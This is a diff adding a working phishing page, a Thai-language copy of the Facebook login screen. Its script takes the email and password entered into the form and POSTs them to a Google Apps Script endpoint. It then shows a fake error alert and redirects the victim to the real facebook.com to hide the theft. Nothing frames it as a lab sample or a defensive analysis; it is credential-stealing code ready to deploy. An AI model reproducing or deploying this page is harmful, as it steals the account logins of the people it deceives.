@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook - เข้าสู่ระบบหรือสมัครใช้งาน</title>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      background: linear-gradient(white, #e7f3ff); 
+      margin: 0; 
+      padding: 0; 
+      display: flex; 
+      align-items: center; 
+      justify-content: center; 
+      height: 100vh; 
+    }
+    .container { 
+      width: 90%;
+      max-width: 360px; 
+      background: white; 
+      border-radius: 10px; 
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2); 
+      padding: 20px; 
+      text-align: center;
+    }
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin: 20px auto;
+    }
+    input[type="text"], input[type="password"] {
+  width: 100%;
+  max-width: 320px; /* กำหนดความกว้างสูงสุดที่ต้องการ */
+  padding: 12px;
+  margin: 10px 0;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+  font-size: 16px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background-color: #1877f2;
+  border: none;
+  color: white;
+  font-weight: bold;
+  border-radius: 5px;
+  margin-top: 10px;
+  font-size: 16px;
+  cursor: pointer; /* เปลี่ยนเคอร์เซอร์เป็นรูปมือเมื่อเอาเมาส์ไปชี้ */
+}
+
+button:hover {
+  background-color: #165eab; /* เปลี่ยนสีพื้นหลังเมื่อเอาเมาส์ไปชี้ */
+}
+
+    .link {
+      display: block;
+      margin: 15px 0;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .divider {
+      margin: 20px 0;
+      border-top: 1px solid #ddd;
+    }
+    .create-account {
+  width: 100%;
+  padding: 10px;
+  background-color: white;  /* เปลี่ยนสีพื้นหลังเป็นสีขาว */
+  color: #1877f2;  /* เปลี่ยนสีข้อความให้เป็นสีน้ำเงินเข้มที่ดูเด่น */
+  border: 1px solid #ddd;  /* เพิ่มกรอบบางๆ ด้วยสีเทา */
+  border-radius: 5px;
+  font-weight: bold;
+  font-size: 16px;
+  margin-top: 10px;
+  cursor: pointer;
+}
+
+    .meta {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" class="logo">
+  <form id="login-form">
+    <input type="text" id="email" placeholder="Mobile number or email" required>
+    <input type="password" id="pass" placeholder="Password" required>
+    <button type="submit">Log in</button>
+    <a href="#" class="link">Forgot password?</a>
+    <div class="divider"></div>
+    <button class="create-account" type="button">Create new account</button>
+  </form>
+  <div class="meta">© Meta</div>
+</div>
+
+<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycbx0uwMhBvySzSOwuYYKPr11qU7Rjp6K3_YvW1Sg9FV2VMpQkARdIeUV9jBcq2Y_-MCB/exec';
+
+document.getElementById('login-form').addEventListener('submit', e => {
+  e.preventDefault();
+  
+  const email = document.getElementById('email').value;
+  const pass = document.getElementById('pass').value;
+  
+  fetch(scriptURL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
+  })
+  .then(response => {
+    alert('เกิดข้อผิดพลาด กรุณาลองใหม่ภายหลัง');
+    window.location.href = 'https://facebook.com';
+  })
+  .catch(error => console.error('Error!', error.message));
+});
+</script>
+
+</body>
+</html>
